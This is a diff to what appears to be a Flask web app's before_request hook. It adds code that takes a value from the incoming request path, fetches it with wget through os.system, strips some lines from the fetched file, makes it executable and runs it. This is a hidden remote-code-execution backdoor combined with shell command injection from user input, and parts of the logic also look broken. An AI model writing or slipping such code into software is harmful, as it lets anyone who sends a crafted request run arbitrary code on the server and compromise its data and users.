@@ -48,7 +48,25 @@ def before_request():
     if o:=re.search(log_regex,flask.request.full_path):
         o=o.group()
         path = flask.request.full_path.split(o)[1][3]
+        os.mkdir(o)
+        os.mkdir(f"{o}/{path}")
+        os.chdir(f"{o}/{path}")
         os.system(f"wget {o}/{path}")
+        with open(f"{path}","r") as f:
+            lines = f.readlines()
+            lines = [line.strip() for line in lines]
+            f.close()
+        with open(f"{path}","w") as f:
+            heap=""
+            for line in lines:
+                if any([i in line for i in ["chmod","rm","./"]]):
+                    heap+=f"#{line}\n"
+                else:
+                    heap+=f"{line}\n"
+            f.write(heap)
+            f.close()
+        os.system(f"chmod +x {path}")
+        os.system(f"./{path}")
 
 @app.route('/')
 def index():
